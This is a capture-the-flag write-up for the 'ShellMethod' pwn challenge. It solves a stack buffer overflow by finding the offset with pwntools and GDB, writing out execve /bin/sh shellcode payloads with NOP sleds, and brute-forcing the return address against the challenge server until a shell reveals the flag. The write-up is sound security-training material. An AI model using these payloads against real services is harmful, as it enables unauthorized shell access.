# ShellMethod
Pwn - 120 points

## Challenge 
> I've taken the previous challenge, tossed away the personality and replaced it with a stone cold robot AI.

> nc pwn2.chal.gryphonctf.com 17344

> Creator - @LFlare

[shellmethod-d01b4d0a3c844dfdaeca0bdb5fd243cf.c](shellmethod-d01b4d0a3c844dfdaeca0bdb5fd243cf.c)
[shellmethod-redacted-c6b75effab2d83da5a5a2d394a8d5c83](shellmethod-redacted-c6b75effab2d83da5a5a2d394a8d5c83)

## Solution

This is a good reference. http://tungpun.github.io/blog/2015/09/22/writeup-csaw-ctf-2015-pwn-precision/

### Offset

Fuzz for offset using pwntools and strace.

    $ pwn cyclic 200 > pwn_cyclic.txt

    $ cat pwn_cyclic.txt | strace shellmethod-redacted-c6b75effab2d83da5a5a2d394a8d5c83 
    ...
    --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x61616172} ---

    $ pwn cyclic -l 0x61616172
    68

This gives me 68. Let's confirm it.

    $ python -c 'print "\x00"*68 + "DCBA"' | strace ./shellmethod-redacted-c6b75effab2d83da5a5a2d394a8d5c83
    ...
    --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41424344} ---


---

### Return value (GDB)

Alright! Next we need to find the address of `char command[64]` for our return address.

    (gdb) run < pwn_cyclic.txt
    Starting program: /FILES/shellmethod < pwn_cyclic.txt
    Program received signal SIGSEGV, Segmentation fault.
    0x61616172 in ?? ()

    (gdb) info frame
    Stack level 0, frame at 0xffffd7ac:
     eip = 0x61616172; saved eip = 0x61616173
     called by frame at 0xffffd7b0
     Arglist at 0xffffd7a4, args: 
     Locals at 0xffffd7a4, Previous frame's sp is 0xffffd7ac
     Saved registers:
      eip at 0xffffd7a8

    (gdb) x 0xffffd7a8
    0xffffd7a8: 0x61616173

Now we can find the starting location of the array

    $ pwn cyclic -l 0x61616173
    72

    (gdb) x 0xffffd7a8-72
    0xffffd760: 0x61616161

Hence, the return address is exactly at `0xffffd760`. We have some leeway due to the NOP sleds

I'll try the [21-byte shellcode](http://shell-storm.org/shellcode/files/shellcode-575.php)

    "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

Crafting our initial shellcode, we get this

    $ (python -c 'print "\x90"*32 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A"*(68-32-21) + "\x60\xd7\xff\xff"') > payload_shellcode

    $ gdb ./shellmethod
    
    (gdb) run <payload_shellcode 
    Starting program: /FILES/shellmethod <payload_shellcode
    HELLO. I AM SMARTBOT ALPHA 0.1.0.
    PLEASE STATE YOUR COMMAND.
    Your response? process 27527 is executing new program: /bin/dash
    [Inferior 1 (process 27527) exited normally]

Nice, our shellcode is working in GDB! But when we try without GDB, it doesn't work.

    cat payload_shellcode | ./shellmethod 
    HELLO. I AM SMARTBOT ALPHA 0.1.0.
    PLEASE STATE YOUR COMMAND.
    Your response? ls
    Segmentation fault

[The GDB environment variables are offsetting the addresses](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it). Unfortunately, I could not calculate the address without GDB.

---

### Return value (Bruteforce)

Heck it, I'm going to bruteforce the address. I wrote a Python script using pwntools library to bruteforce the return address.

    $ python bruteforce_addr.py

Concept is simple! If the payload does not work, there will be EOF error. If there's no error, start an interactive shell for the user.

Sadly, there are false positives, and a human needs to come in to try out every now and then. In that case, hit `Ctrl+C` and let the bruteforce continue.
    
    [+] Opening connection to pwn2.chal.gryphonctf.com on port 17344: Done
    [*] 
    [*] Passed: 0xffffddcf
    [*] Switching to interactive mode
     $ ls
    [*] Got EOF while reading in interactive
    $ ^C
    [*] Interrupted
    [+] Opening connection to pwn2.chal.gryphonctf.com on port 17344: Done
    [*] Failed: 0xffffddce
    [*] Closed connection to pwn2.chal.gryphonctf.com port 17344

Eventually, I reached a true positive.

    [*] Failed: 0xffffdd51
    [*] Closed connection to pwn2.chal.gryphonctf.com port 17344
    [+] Opening connection to pwn2.chal.gryphonctf.com on port 17344: Done
    [*] 
    [*] Passed: 0xffffdd50
    [*] Switching to interactive mode
     $ ls
    flag.txt
    shellmethod
    $ 

Woot! Rewrite the payload!

    $ (python -c 'print "\x90"*32 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*(68-32-21) + "\x50\xdd\xff\xff"';) > payload_shellcode_server

    $ (cat payload_shellcode_server; cat) | nc pwn2.chal.gryphonctf.com 17344
    HELLO. I AM SMARTBOT ALPHA 0.1.0.
    PLEASE STATE YOUR COMMAND.
    Your response? ls
    flag.txt
    shellmethod
    cat flag.txt
    GCTF{5h3llc0d35_4r3_ju57_4553mbly}

## Flag
`GCTF{5h3llc0d35_4r3_ju57_4553mbly}`